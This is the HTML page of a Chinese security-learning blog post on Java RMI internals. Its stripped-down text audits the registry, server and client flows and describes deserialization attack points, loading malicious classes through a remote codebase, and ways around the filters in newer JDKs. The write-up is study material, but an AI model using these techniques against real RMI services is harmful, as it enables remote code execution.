<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>java-RMI | VV</title><meta name="keywords" content="java安全,java,学习"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="java-RMI"><meta name="application-name" content="java-RMI"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="java-RMI"><meta property="og:url" content="http://cszvvds.cc/2024/05/23/java-RMI/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="JAVA - RMI这个还是理解了挺久的  主要是第一次代码审计 又枯燥又难 审着犯困 效率挺低的 RMI基础RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大 如果只懂利用，就太脚本小子了 定义java RMI全称为 java Remote Method Invocation（ja"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="JAVA - RMI这个还是理解了挺久的  主要是第一次代码审计 又枯燥又难 审着犯困 效率挺低的 RMI基础RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大 如果只懂利用，就太脚本小子了 定义java RMI全称为 java Remote Method Invocation（ja"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/05/23/java-RMI/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'VV',
  title: 'java-RMI',
  postAI: '',
  pageFillDescription: 'JAVA - RMI, RMI基础, 定义, 组成, 客户端：(Client  上图右边部分), 服务段：（Server 上图中间部分）, 注册表（Registry 上图的左侧部分）, 通信流程, 服务端：, 客户端：, 结果：, 其他, RMI-代码审计, 服务端的创建流程, 注册中心的创建流程, 注册绑定, 客户端请求注册中心和服务端, 获取远程对象的代理, 总结, 向服务端做远程调用, 总结, 注册中心回应客户端, 服务端回应客户端, DGC, RMI 攻击利用, 低版本jdk, 简单利用, 更低版本的利用, 高版本jdk绕过利用, UnicastRef.class, java.lang.reflect.Proxy.class, 工具：, exploit, payloads这个还是理解了挺久的主要是第一次代码审计又枯燥又难审着犯困效率挺低的基础作为后续漏洞中最为基本的利用手段之一学习的必要性非常之大如果只懂利用就太脚本小子了定义全称为远程方法调用是编程语言中一种实现远程过程调用的应用程序编程接口存储于包中使用其方法调用对象时必须实现远程接口能够让某个虚拟机上的对象调用另外一个虚拟机中的对象上的方法两个虚拟机可以运行在相同计算机上的不同进程也可以是网络上的不同计算机两者之间通过网络进行通信组成如上图基本分为三层架构模式来实现分别为服务端客户端和注册中心客户端上图右边部分存根桩远程对象在客户端上的代理远程引用层解析并执行远程引用协议传输层发送调用传递远程方法参数接收远程方法执行结果服务段上图中间部分骨架读取客户端传递的方法参数调用服务器方的实际对象方法并接收方法执行后的返回值远程引用层处理远程引用后向骨架发送远程方法调用传输层监听客户端的入站连接接收并转发调用到远程引用层其是理论上有客户端有服务段就可以进行远程方法的调用了但是是通过端口进行调用的这就出现一个问题端口只有到这明显是不够用的不能全来给吧所以这就出现了的第三部分注册表注册表上图的左侧部分以形式注册远程对象并向客户端回复对远程对象的引用注册中心是一个表用来存储名字和远程对象客户端是连接注册中心获取名字来调用远程对象客户端和服务端并不是直接进行交互的而是利用了代理服务端的代理叫做客户端的代理叫做用代理的目的是为了把不属于业务的东西提取出来客户端注册表服务端通信流程服务端先编写一个远程接口其中定义了一个的方法此远程接口要求作用域为继承接口让其中的接口方法抛出异常定义该接口的实现类实现远程接口继承类用于生成存根和骨架这个在后续的通信原理当中会讲到构造函数需要抛出一个错误实现类中使用的对象必须都可序列化即都继承注册远程对象实例化远程对象创建注册中心绑定对象示例到注册中心默认是不写会自动补上其他端口必须写的绑定这里只要和客户端去查找的一致即可如此服务端就写好了个分为三部分个继承了的接其中定义我们要远程调的函数如这的个实现了此接的类个主类来创建并将上的类实例化后绑定到个地址这就是我们所谓的了客户端客户端只需从从注册器中获取远程对象然后调用方法即可当然客户端还需要一个远程对象的接口不然不知道获取回来的对象是什么类型的虽说执远程法的时候代码是在远程服务器上执的但实际上我们还是需要知道有哪些法这时候接的重要性就体现了所以在客户端这里也需要定义一个远程对象的接口然后编写客户端的代码获取远程对象并调用方法这样就能够从远端的服务端中调用对象的方法了结果可以看到这里客户端右边没有实现具体的方法内容但是执行了服务端左边的方法体内的代码其他其实接口也可以直接继承我们前要继承并将我们需要调的法写在接因为客户端也需要到这个接也就是服务端这里我三合一了运行的时候要分开客户端客户端就简单多了使在中寻找到名字是的对象后的使就和在本地使样了这里我们可以抓包看下如上图这就是完整的通信过程我们可以发现整个过程进了两次握也就是我们实际建了两次连接第次建连接是连接远端的端这也是我们在代码看到的端者进沟通后我向远端发送了个消息远端回复了个消息然后我新建了个连接连到远端的端那为什么要连接端口呢细细阅读数据包我们会发现在这个包中返回了标的地址其后跟的个字节刚好就是整数的络序列如下其实这段数据流中从开始往后就是序列化数据了和端只是这个对象的部分罢了所以的利用也就是通过反序列化进行利用所以捋捋这整个过程先客户端连接并在其中寻找是的对象这个对应数据流中的消息然后返回个序列化的数据这个就是找到的的对象这个对应数据流中的消息客户端反序列化该对象发现该对象是个远程对象地址在于是再与这个地址建连接在这个新的连接中才执真正远程法调也就是就像个关他是不会执远程法的但可以在上注册个到对象的绑定关系通过向查询得到这个绑定关系然后再连接最后远程法实际上在上调但是为什么示例代码只有两个部分呢原因是通常我们在新建一个的时候都会直接绑定一个对象在上面也就是说我们示例代码中的其实包含了和两部分第一行创建并运行第二行将对象绑定到这个名字上的第一个参数是一个形如其中和就是的地址和端口是远程对象的名字如果在本地运行那么和是可以省略的此时默认是默认是代码审计首先有三部分如果两两通信就是个交互流程还有三个创建的过程一共是九个过程产生漏洞的地方肯定是在交互过程中发生的但是出问题的是在哪部分呢为了寻找问题到底是出在哪部分我们从服务端的创建开始逐个分析服务端的创建流程开始分析创建远程对象的这个流程因为这个流程是把服务发布到网上我们一步一步来看它是如何发布的在图示地方下断点下一步走到构造函数再下一步走到的构造函数同时注意到此时的是这里的就是代表默认值如果传入的话会开启一个随机端口因为这里是把服务发布到网络上如果对端口有疑惑为什么不是的要注意区分注册中心和服务端口的区别所以不可能每种服务固定一个端口这样子一旦服务过多端口会不够用的下一步我们跟到调用导出对象这个地方根据英文意思这里就是发布对象的感觉这是一个静态函数而且也是关键语句因此我们在这个类中也可以不继承这个类直接在构造函数中调用这个静态方法也可以这个是我们要实现的真正逻辑后面的是用于处理网络请求的可以注意到这里只传了进去因此是他可以自动获取到的下一步可以看见新建了一个类我们跟进传进去的是一个和一个就是理解成给个编号吧就是之前的默认端口然后我们就不看了直接跟进他的构造函数然后可以看到第一个参数是第二个参数是的一个静态函数第三个参数我们这里只看第二个参数这里没有必要继续跟进直接停在这里然后鼠标左键点击进入即可可以看到他的里面是返回类型为的一个东西再看一下的构造函数发现这里他要接受两个参数和可以感受到这个东西就是一个处理网络请求的东西然后我们返回到的地方这里调用了另一个构造函数我们再看一下的构造函数接收三个参数其他都好理解主要就是这个是什么我们看一下它里面有什么东西发现这里已经被获取了但是还是如何获取我们后面在分析的创建到这里就完成了我们需要记住的并且我们从头到尾只创建了这一个再往下走这里也只进行了赋值继续往下走这里的就是刚才赋值的的那个东西只不过包装了而已而且这也进行了赋值然后继续往下走到继续对但是我们发现这里创建了代理明明是客户端的代理为什么要在服务端创建因为需要现在服务端创建完这个代理放在注册中心客户端再到注册中心去使用这个进行操作我们往下看一下这个是怎么创建的第一步是创建一个远程对象类第二步是判断表示当不存在时是否抛出异常是否存在以结尾的类的具体逻辑是这样的第三步就是创建动态代理了创建完就是收尾工作这里创建了一个这里可以看到的是一样的也都是一样的说明用的都是同一个创建完就进行发布就是对这个进行发布我们跟进到里面这个部分获取了随机的端口号可以发现这里创建了一个等待别人连接并且使用了创建一个新的线程此时已经成功把服务发布到网络上面了但是客户端并不知道注册中心也不知道所以他自己需要先记录一下这个发布的服务发现这里是用来记录的并且把刚才创建的当作值同时这里还是一个静态表从思路来说是不难的也就是发布远程对象用指定到发布的与端口端口的话是一个随机值至始至终复杂的地方其实都是在赋值创建类进行各种各样的封装实际上并不复杂还有一个过程就是发布完成之后的记录理解的话类似于日志就可以了这些记录是保存到静态的当中这一块是服务端自己创建远程服务的这么一个操作所以这一块是不存在漏洞的注册中心的创建流程注册中心的创建和远程服务的发布其实是没有关系的他们之间并不在乎谁先谁后因为发布远程服务和注册中心的创建他们本质上都是一样的都是把某个服务发布到某个端口上只不过注册中心通常是固定在端口而服务则是随机发布到某一个端口上在处下断点我们开始调试代码首先是进入了静态方法并且传入了然后这里了一个我们就顺势走到的构造方法里面主要是做一些检查不重要重点看下面的一个然后又了一个并且把放在里面之后调用了这里其实和前面服务端的创建时一样的流程只是这里调用了方法直接进去看一下创建注册中心的流程前三步是不是都和发布远程对象一样的步骤接下来其实也是调用了了这样看来其实发布远程对象和创建注册中心本质上就是一样的了他们都执行了一样的步骤唯一的区别就是调用时第三个参数不一样其实就是代表一个是永久而另一个是非永久罢了接下来我们继续跟进到函数里面到目前为止和我们之前调试发布远程对象都一样但是我们跟进到里面就开始有区别了因为这里会执行一个这个函数的代码逻辑如下功能就是判断中是否有以的类有的话就加载于是就会进入这个类中把他加载出来具体的加载逻辑是这样的这里利用反射获取类名然后利用构造器进行实例化加载这个类这里和服务端的区别就是服务端是利用动态代理创建出来的而注册中心是利用自由的类反射创建出来的接着往下走这一步就是判断是否是服务端定义好的因为这里的确实是服务端已经定义好的于是我们跟进到里面再跟到发现这里和上面创建一样也是直接利用反射获取的类名来实例化这个类出来之后就是创建然后发布到网络上和发布远程对象一样的下一步一样的封装可以看到这里还是同一个分布式垃圾回收可以注意到远程服务的类型是动态代理创建的类型为注册绑定这个就是判断是否本地绑定然后上面那个判断就是判断这个是否绑定过没绑定过就呗这个本质上就是一个然后把远程对象绑定进去客户端请求注册中心和服务端客户端需要做两件事向注册中心获取远程对象的代理通过这个代理向服务端做远程调用获取远程对象的代理我们可以发现他的流程和服务端的一样都是重新然后利用来加载类执行完后我们可以看到这里就是获取注册中心的对象下一步就是通过名字来获取远程对象我们往下看这里因为是编译的但是我们的环境是所以这里在进行反编译的时候就会因为反编译的时候行号会乱而且无法进行直接看静态代码下面那个就是创建一个连接然后有一个这个就是我们传进来的字符串我们发现了他被序列化了到时候注册中心就会反序列化读取他再往下就是重点方法方法会调用方法方法中的捕获异常中有一个在这里如果服务端是一个恶意的类被服务端加载的话就可以达到攻击客户端的目的执行完下面还有一个攻击客户端的利用点因为这里客户端获取服务端的远程对象的过程是通过反序列化读取他的那么如果服务端是恶意的反序列反参数就可以攻击客户端但是这两个反序列的攻击点还是进去的这里更加隐蔽更加常用到因为很多函数都会调用方法如总结客户端请求注册中心的时候有两个反序列化的点和里面的向服务端做远程调用我们从开始调试发现我们调试第一步就直接进入了因为这里是一个动态代理所以调用方法的时候就会直接进入我们从进入然后跟进之后的走到函数这个函数就是判断是否是基本类型不是的话就序列化再往下发现执行了其实不管是用户自定义的还是系统定义的都会调用这个方法是处理网络请求的东西东西这里也有可能被攻击再往下走如果调用的远程函数有返回值的话会执行并且获取远程返回值是利用反序列化读出来的总结客户端请求服务端的时候有两个反序列化的点和最后读取返回值处理走的是协议所以通过进行攻击就是通过自定义的客户端协议进行攻击攻击的是可以是客户端攻击服务端也可以是服务端攻击客户端注册中心回应客户端我们之前有说客户端在的时候需要把序列化发给注册中心然后注册中心再反序列化我们再传入的时候是所以这里也是通过找到这里其实只要有的都可能会被反序列化攻击服务端回应客户端我们之前有说客户端在的时候需要把序列化发给服务端然后服务端再反序列化会在创建远程服务的时候就自动创建服务我们来关注服务是在何时何处产生的我们定位到这个函数就是在众多七七八八的都创建完之后执行的把一些东西放在静态表里面我们可以注意到在中有一个服务就是在这里创建的这里是调用了类的静态函数在类的动态加载中我们提到只要调用了类的静态函数就对这个类进行了初始化因此会执行类的静态代码块在的静态代码块里面的里执行了再往下看一下是怎么创建的其实原理和我们之前分析服务端的和客户端的一样看一下是否有这个类有则反射创建在类中有两个方法和这两个函数都有我们之前说过比较危险的地方和因此存在被攻击的风险也是同理也存在危险的地方攻击利用低版本上面我们审计的是的版本实际上相对很老攻击面也如上哪儿哪儿都可以进行攻击具体怎么攻击我还没有找到相应的学习资料等学完反序列化这部分应该对怎么利用更清楚一点好像是会用到链来这里我讲讲一个更低版本的利用简单利用先阐述一些简单的利用吧但这个利用没有什么价值首先是一个远程对象管理的地方可以理解为一个远程对象的后台我们可以尝试直接访问后台功能比如修改远程服务器上对应的对象却爆出了这样的错误原来对远程访问做了限制只有来源地址是的时候才能调用等方法不过和方法可以远程调用方法可以列出目标上所有绑定的对象作用就是获得某个远程对象那么只要目标服务器上存在一些危险方法我们通过就可以对其进行调用之前曾经有一个工具其中一个功能就是进行危险方法的探测怎么说呢这个利用嗯更低版本的利用曾经有段时间是可以运行在浏览器中的对就是这个奇葩在使用的时候通常需要指定一个属性比如除了中也存在远程加载的场景也会涉及到是一个地址告诉虚拟机我们应该从哪个地方去搜索类有点像我们日常用的但是本地路径而通常是远程比如等如果我们指定然后加载类则虚拟机会下载这个文件并作为类的字节码的流程中客户端和服务端之间传递的是一些序列化后的对象这些对象在反序列化时就会去寻找类如果某一端反序列化时发现一个对象那么就会去自己的下寻找想对应的类如果在本地没有找到这个类就会去远程加载中的类这个时候问题就来了如果被控制我们不就可以加载恶意类了吗对在中我们是可以将随着序列化数据一起传输的服务器在接收到这个数据后就会去和指定的寻找类由于被控制导致任意命令执行漏洞不过显然官方也注意到了这一个安全隐患所以只有满足如下条件的服务器才能被攻击安装并配置了版本低于或者设置了其中是在的时候修改的一个默认设置官方将的默认值由改为了在配置为的情况下虚拟机将只信任预先配置好的不再支持从请求中获取我们来编写一个简单的用于复现这个漏洞建立个文件同样这里我也是合一了编译运行其中是服务器的地址远程调用时需要根据这个值来访问然后我们再建立一个这个我们需要在另一个位置运行因为我们需要让在本地里找不到类才会去加载中的类所以不能将放在所在的目录中运行查看的日志可见收到了来自的请求因为我们还没有实际放置这个类文件所以上面出现了异常我们只需要编译一个恶意类将其文件放置在服务器的即可这种利用条间比较苛刻高版本绕过利用前面低版本主要利用在注册中心和高版本以上当然重点对这两个包里的类进行了处理具体怎么实现的这里简单说下这里加了一个函数这里多加了一个判断这个输入流如果是这几个类才能反序列化更上面这个差不多甚至更严重一些这里有一个函数同样也有也是只有这几个类才能反序列化远程对象直接反序列化之前不是还用远程对象之间反序列化吗在高版本下这个流程太复杂了没分析明白是必须知道具体参数类型才行这种限制很大因为远程对象直接反序列化限制态度难以利用的几个类都是些没有什么功能的类难以利用故我们只能从注册中心下手这也是为什么一般都打注册中心的原因看来看去其实也就两个类可以利用其他都没什么用先说下这个吧前面我们审过这个也是最常用的我们前面分析的时候提到过有一个方法也就是那个的一个攻击所有客户端都会收到攻击但是他的高版本只修复服务端的攻击对客户端的攻击并没有修复所以接下来我们的思路就是想办法让服务端来发起一个客户端请求这样就会在服务端引起一个反序列化的攻击是怎么被调用的呢不就是那几个吗还有一个动态代理但这个只有在生成创建服务端时才会调用怎么创建呢是通过一个函数那这个函数在哪里可以调用呢注册中心中调用中调用中导出时调用注册中心的都没什么用调用不了静态代码块中调用没办法干涉这个才是我们能调用的在构造函数创建了一个服务我们无法在一个已经跑起来的程序中来改变代码逻辑只能是通过反序列化的方式来实现所以以这里做为入口想办法创建一个类并生成一个让来发起一个客户端请求先来第一步从往上找直到找到一个反序列化的点找到一个没用再往上找是一个没用再往上找找到两个地方有一个是另一个点是一个里面如果这个输入流不是才会调用但是整个输入流都是所以根本调用不了所以要从往上找找到在里面不觉得熟悉这不是的那个攻击点吗而会创建一个服务在哪儿调的呢是在里面到这里流程就通了不是在服务端吗那不就是说明我们在服务端找到一个点能让他创建一个服务那下一步我们让这个服务发起一个请求就行注意在中有一个这是阻挡我们的地方当他是空的时候就会调用所以接下来我们再动态调试找怎么才能让他不是空最后发现中的方法再调试找到刚刚的方法函数又是再哪儿调的呢这个有点像原生类也就是说在反序列化的时候有这个类也会调用由此我们先序列化一个对象在里面保存一个在的反序列化流程里面他会调用然后就是然后就会把赋值这样就不为空了此时内存里面的那个表就已经有值了接下来就正常走反序列化流程到接着就会往下走这个表就不为空了这样我们的攻击就会在正常的反序列化中进行到这里但这里我们只做了赋值还没有进行请求注意后面的这是在调自己里面的线程这个线程是什么呢它其实最后是调了一个它其实就是调了这个很少在用还记得我前面用的那个低于的利用吗那个是用来加载远程类在服务端执行任意代码这里我们从原理上阐述一下我们用来抓一下那个包当然也有个连接本机与的通信在我的数据包中是端口本机与的通信在我的数据包中是端口我们用来筛选出本机与的数据流可见在与通信的时候识别出了协议类型我们选择其中序号是的数据包然后复制识别出的数据段这段数据由开头这是一段序列化数据我们可以使用对序列化数据进行分析输出了很多预定义常量像这种它究竟表示什么意思呢此时我们还得借助序列化的协议文档这篇文档里用了一种类似巴科斯范式的形式描述了序列化数据的语法比如我们这里的这段简单的数据其涉及到如下语法规则其中这部分对应的是这部分对应的是都可以在文档里找到完整的语法定义这一整个序列化对象其实描述的就是一个字符串其值是意思是获取远程的对象接着我们在序号为的数据包中获取到了这个对象这是一个对象其中有一段数据储存在中记录了的地址和端口在拿到的地址和端口后本机就会去连接并正式开始调用远程方法我们再用筛选出本机与的数据流可见没有再识别出的协议我们选择序号为的数据包其内容是开头是指当然是序列化数据我们使用查看这段序列化数据可见我们的是通过的传递的所以即使我们没有的客户端只需要修改的值就能控制使其指向攻击者的恶意网站工具工具里是直接可以攻击的里是需要一些工具来的有三个低版本的直接攻击注册中心的低版本攻击服务服务端发客户端请求攻击普通的也行里面有两个用的很少在一个已有反序列化的点里传进去后会暴露出一个的接口出来也就是将一个普通的反序列化点转换成一个的反序列化点相当于二次反序列化可能会绕过一些过滤这个就很常见了是整个分析里面最重要的一个链子前面的都是在针对来打的也就是针对服务但如果没看服务呢可以通过上面那个给他开一个也可以是用这个不用开也能打利用条件还比上一个宽也相当于一个二次反序列化可以打非的利用链',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-24 09:51:04',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 5 || hour >= 5
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 1.05rem;">CC链<sup>7</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>2</sup></a><a href="/tags/Windows/" style="font-size: 1.05rem;">Windows<sup>2</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>13</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>13</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>9</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>9</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>15</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>26</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">提权<sup>3</sup></a><a 